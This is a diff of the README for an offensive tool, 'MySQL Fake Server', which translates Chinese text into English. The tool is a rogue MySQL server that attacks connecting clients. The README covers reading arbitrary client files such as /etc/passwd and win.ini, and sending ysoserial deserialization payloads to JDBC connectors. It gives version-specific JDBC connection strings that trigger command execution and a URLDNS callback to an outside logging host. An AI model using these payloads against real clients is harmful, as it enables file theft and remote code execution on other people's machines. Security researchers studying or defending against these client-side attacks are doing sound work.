@@ -1,168 +1,133 @@
 # MySQL Fake Server
-[ENGLISH](README_EN.md)|简体中文
+A fake MySQL Server used for penetration,which is implemented by  native python3 with out any other dependency package.
 
-用于渗透测试过程中的假MySQL服务器，纯原生python3实现，不依赖其它包。
+Modified from Poject:https://github.com/waldiTM/python-mysqlproto
 
-修改自项目https://github.com/waldiTM/python-mysqlproto
+## Use
 
-## 用途
+1. MySQL Client Arbitrary File Reading Exploit
+2. MySQL JDBC Client's Java Deserialization Vulnerable Exploit
 
-1. MySQL服务端读取客户端文件漏洞利用
-2. MySQL JDBC客户端Java反序列化漏洞利用
+## Description
+1. Python3 Environment ，no need to install other package.
+2. Run Command：`python server.py`
+3. [Ysoserial](https://github.com/frohoff/ysoserial) is required to use the deserialization Exploit，Support Attributes`ServerStatusDiffInterceptor` and `detectCustomCollations`.
+4. MySQL user name supports special symbols such as colons and slashes, but whether it can be used depends on the specific client environment.
+5. **Recommended usage:**config.json contains some preset information, you can modify and add the File Reading and yso parameters corresponding to the specified user name by yourself. See the following instructions for details
+6. According to the **login user name** to return the File Reading Exploit packet or deserialize Exploit packet.
 
-## 更新说明
+## Test Environment：
+1. jdk1.8.20+mysql-connector-java 8.0.14/5.1.22(Deserialization on Windows（JRE8u20）、File Reading)
+2. PHPMyAdmin(File Reading on Windows  an Linux，can use relative path to read php file)
+3. Navicat 12(File Reading on Windows，nead switch to mysql_clear_password Authentication plugin)
 
-**2021.06.01**
-
-儿童节快乐~
-
-**文件读取部分**
-
-- 支持了大文件的读取，可完整的读取二进制文件。
-- 测试了PDF\EXE\ZIP\JAR文件，最大测试了读50MB的ysoserial，md5正常，可正常使用。
-
-![image-20210531165349198](README.assets/image-20210531165349198.png)
-
-- 请勿使用cmd.exe等测试吗md5，从system32目录中拷出来md5就不一样了。
-- 现在可以将读取到文件保存到文件中（文件名为“客户端ip\_\_\_时间戳\_\_\_替换掉特殊字符的文件路径”，特殊字符为"/\\:"）
-- 由于目前是一次性读完文件内容后再进行写入，所以如果想读GB级文件的朋友请自行掂量内存大小，或者将写入改为读一部分写一部分
-- 增加了未知用户名情况下，读取预设文件的功能(非预置用户名且非yso\_和fileread\_开头，config.json中__defaultFiles选项)
-- 目前测MySQL JDBC Connector 5.1.x的版本需要在连接串中加一个`maxAllowedPacket=655360`属性，否则会报错，有兴趣的师傅可以自己跟一下原因。
-- 有关JDBC下的`allowUrlInLocalInfile`选项可以看下这篇：[https://blog.csdn.net/fnmsd/article/details/117436182](https://blog.csdn.net/fnmsd/article/details/117436182)
-
-**增加了config.json配置项目**
-
-- java和ysoserial的位置配置
-- 读取到的文件是否输出预览（前1000字节到控制台）
-- 文件保存路径及保存开关
-
-**其它**
-
-- Ctrl+C可以直接关闭server了
-
-## 说明
-1. 需要python3环境，无任何其它依赖。
-2. 运行：`python server.py`
-3. 需要[ysoserial](https://github.com/frohoff/ysoserial)才能用反序列化功能，支持`ServerStatusDiffInterceptor`和`detectCustomCollations`两种方式。
-4. MySQL的用户名支持冒号、斜杠等特殊符号，但是能否使用还需看具体客户端环境。
-5. 根据 **登录用户名** 返回文件读取利用报文、反序列化利用报文。
-6. **推荐用法：** config.json中预置了一部分配置信息，可以自己修改添加指定用户名对应的读取文件和yso参数，详细看下面的说明
-
-## 测试环境：
-1. jdk1.8.20+mysql-connector-java 8.0.14/5.1.22(Windows下反序列化（JRE8u20）、文件读取)
-2. PHPMyAdmin(Windows+Linux文件读取，可以使用相对路径读取php文件内容)
-3. Navicat 12(Windows下文件读取，需要切换到mysql_clear_password认证插件)
-
-## 使用方法
-默认的config.json:
+## Instructions
+Default config.json:
 
 ```json
 {
      "config":{
-        "ysoserialPath":"ysoserial-0.0.6-SNAPSHOT-all.jar", //YsoSerial位置
-        "javaBinPath":"java",//java运行命令位置
-        "fileOutputDir":"./fileOutput/",//读取文件的保存目录
-        "displayFileContentOnScreen":true,//是否输出文件内容预览到控制台
-        "saveToFile":true//是否保存文件
+        "ysoserialPath":"ysoserial-0.0.6-SNAPSHOT-all.jar", //YsoSerial Location
+        "javaBinPath":"java",//java Command Location
+        "fileOutputDir":"./fileOutput/",//File Save Directory
+        "displayFileContentOnScreen":true,//Whether to preview the content of the output file to the console
+        "saveToFile":true//Whether to save the file
     },
-//文件读取参数
+//File Reading Params
     "fileread":{
-        "win_ini":"c:\\windows\\win.ini",//key为设定的用户名,value为要读取的文件路径
+        "win_ini":"c:\\windows\\win.ini",//key is username,value is the path for file reading
         "win_hosts":"c:\\windows\\system32\\drivers\\etc\\hosts",
         "win":"c:\\windows\\",
         "linux_passwd":"/etc/passwd",
         "linux_hosts":"/etc/hosts",
         "index_php":"index.php",
-        "__defaultFiles":["/etc/hosts","c:\\windows\\system32\\drivers\\etc\\hosts"]//未知用户名情况下随机选择文件读取
-
+        "__defaultFiles":["/etc/hosts","c:\\windows\\system32\\drivers\\etc\\hosts"]//Randomly select files to read in case of unknown user name
     },
-//ysoserial参数
+//ysoserial Params
     "yso":{
-        "Jdk7u21":["Jdk7u21","calc"]//key为设定的用户名,value为ysoserial参数的参数
+        "Jdk7u21":["Jdk7u21","calc"]//key is username,value is ysoserial's run params.
     }
 }
 ```
 
-1. 文件读取：
+1. File Reading Exploit：
 
-    - 可以在config.json中fileread节中预定义好要读取的文件(比如win_ini用户名读取win.ini文件)
-    - 可以用fileread_开头的用户名(例如使用用户名fileread\_/etc/passwd来读取/etc/passwd文件)
+    - The filepath to be read can be predefined in the fileread section of config.json(e.g.:  use username `win_ini`to read `win.ini`)
+    - Can use the username starting with fileread_(e.g.:use username `fileread_/etc/passwd` to read `/etc/passwd`)
+    - Some new version restrict read local file, add `allowLoadLocalInfile=true` option to allow read local file. E.g: jdbc:mysql://127.0.0.1:3306/test?allowLoadLocalInfile=true&user=win_hosts
 
-2. 反序列化
-    - 可在config.json中yso节预定义好yso payload的生成参数(比如Jdk7u21用户名返回Jdk7u21执行计算器的gadget)
+2. Deserialize Exploit:
+    - The yso payload generation parameters can be predefined in the yso section in config.json(e.g. username `Jdk7u21` return Jdk7u21 gadget with open calculator)
 
-    - 可以用yso_开头的用户名，格式yso\_payload类型\_命令（例如jdk7u21调用calc就使用用户名yso\_Jdk7u21\_calc）
+    - Can use the username starting with `yso_`.The format is `yso_payloadType_command`（e.g: yso_Jdk7u21_calc）
 
-      jdbc连接串示例：
+      JDBC connection string examples：
+
       - `jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_Jdk7u21_calc`
       - `jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_URLDNS_http://yourdns.log.addr/`
 
-3. 关于认证：默认认证插件一般使用**mysql_native_password**,但是由于协议实现的问题，navicat下会连接失败，此时在使用的用户名后追加 **_clear** 即可切换为mysql_clear_password,navicat连接成功,读取到文件。
+3. About authentication：The default authentication plugin is **mysql_native_password**,But due to the bugs of protocol implementation，it will  connect failed with Navicat client.
 
-    - **例如：** fileread\_/etc/passwd_clear
+    At this time, append **_clear** to the username for switch the  authentication plugin to **mysql_clear_password**, and the Navicat client will connect to fake server successfull and get the file content.
 
-## JDBC连接串整理
+    - **e.g.：** fileread\_/etc/passwd_clear
 
-写分析的时候整理了一下：https://www.anquanke.com/post/id/203086
-用户名请参考上面的说明进行修改。
+## JDBC Connection Strings
 
-### ServerStatusDiffInterceptor触发
+I sorted JDBC Connection Strings out  while writing the analysis：https://www.anquanke.com/post/id/203086
+Please refer to the above description to modify the username.
+
+### ServerStatusDiffInterceptor Attribute Exploit:
 
 - **8.x:** `jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc`
 
-- **6.x(属性名不同):** `jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc`
+- **6.x(Attribute name is different):** `jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc`
 
-- **5.1.11及以上的5.x版本（包名没有了cj）:**` jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc`
+- **5.1.11 and above 5.x version（package name with out "cj"）:**` jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc`
 
-- **5.1.10及以下的5.1.X版本：** 同上，但是需要连接后执行查询。
+- **5.1.10 and below 5.1.X version：** Same as above， But you need to execute arbitrary query after connecting。
 
-- **5.0.x:** 还没有`ServerStatusDiffInterceptor`这个东西┓( ´∀` )┏
+- **5.0.x:** No`ServerStatusDiffInterceptor`Attribute yet.┓( ´∀` )┏
 
-### detectCustomCollations触发：
+### detectCustomCollations Attribute Exploit：
 
-- **5.1.41及以上:** 不可用
+- **5.1.41 and above:** unavailable
 
 - **5.1.29-5.1.40:** `jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_JRE8u20_calc`
 
 - **5.1.28-5.1.19：** `jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&user=yso_JRE8u20_calc`
 
-- **5.1.18以下的5.1.x版本：** 不可用
+- **5.1.x versions below 5.1.18：** unavailable
 
-- **5.0.x版本不可用** 
+- **Version 5.0.x is not available** 
 
-## 效果
+## Some Examples
 
-Navicat文件读取（用户名使用win_ini_clear）
+Navicat File Reading Exploit（username is win_ini_clear）
 
 ![image-20200414150112426](README.assets/image-20200414150112426.png)
 
-JDK 1.8.20+mysql-connector-java 8.0.14反序列化，使用用户名：yso_JRE8u20_calc
+JDK 1.8.20+mysql-connector-java 8.0.14 Deserialization Exploit，(username is yso_JRE8u20_calc)
 
 ![image-20200414150417471](README.assets/image-20200414150417471.png)
 
-## 踩过的坑
+## Some pits in coding
 
-1. SHOW VARIABLES 相关
-   - 会读取两列，所以需要返回两列，否则会报错。
-   - JDBC连接的时候回通过调用`SHOW VARIABLES`获取服务器变量，其中最重要的是两个时区变量`system_time_zone`和`time_zone`，在getObject过程，会调用到时区相关信息，没有这两个会直接报错
-2. jdbc的Blob判定条件除了字段类型为blob，还要求字段声明的org_table字段不为空，flags大于128，否则会被当做text进行解析。（com.mysql.cj.protocol.a.NativeProtocol的findMysqlType方法）
-3. 原python-mysqlproto中的序列检测需要去掉，否则会出错（这个应该是哪里处理有问题导致了序号重置）。
-4. `SHOW SESSION STATUS`和`SHOW COLLATION`的公用列是第二列
-5. mysql java connector 5.x的环境下，需要返回的server版本大于等于5.0.0才会走到`Util.resultSetToMap`进入getObject
+1. About `SHOW VARIABLES `
+   - Two columns are required, otherwise an exception will be throwed.
+   - When JDBC is connected, the server variables are obtained by calling `SHOW VARIABLES`, the most important variables  are two time zone variables `system_time_zone` and `time_zone`. In the getObject function, the time zone related information is needed, without these two will throw an exception.
+2. Jdbc's Blob judgment condition is that the field type is blob, the org_table field declared by the field is not empty, and flags is greater than 128, otherwise it will be parsed as text（Function`findMysqlType` in Class `com.mysql.cj.protocol.a.NativeProtocol`）
+3. Sequence order detection in Orignal `python-mysqlproto` Project need to be removed，otherwise an exception will be throwed.（There should be a unfound problem that caused the serial number to be reset）。
+4. `SHOW SESSION STATUS`and`SHOW COLLATION`'s share column is the second column.
+5. In the environment of mysql java connector 5.x, the server version returned by server need to be greater than or equal to 5.0.0 ,and execution flow will enter into `Util.resultSetToMap` and then into `getObject`
 
-## 招聘了招聘~
+## Reference
 
-阿里云安全WAF&RASP团队目前招聘中，欢迎各位大佬投递简历，大家一起来愉快地玩耍~^_^
-
-简历投递至：lifangrun.lfr@alibaba-inc.com
-
-## 参考资料
-
-**项目基础：**
+**Project basis：**
 
 https://github.com/waldiTM/python-mysqlproto
 
-**漏洞相关:**
+**Vulnerability related:**
 
 https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf
 
@@ -170,7 +135,7 @@ https://paper.seebug.org/1112/
 
 https://github.com/codeplutos/MySQL-JDBC-Deserialization-Payload
 
-**协议相关：**
+**Agreement related：**
 
 https://dev.mysql.com/doc/internals/en/protocoltext-resultset.html
 
@@ -178,7 +143,7 @@ https://dev.mysql.com/doc/internals/en/character-set.html
 
 https://dev.mysql.com/doc/internals/en/com-query-response.html#packet-Protocol::LOCAL_INFILE_Data
 
-## 404星链计划
+## 404Starlink
 <img src="https://github.com/knownsec/404StarLink-Project/raw/master/logo.png" width="30%">
 
-MySQL_Fake_Server 现已加入 [404星链计划](https://github.com/knownsec/404StarLink)
+MySQL_Fake_Server has joined [404Starlink](https://github.com/knownsec/404StarLink)
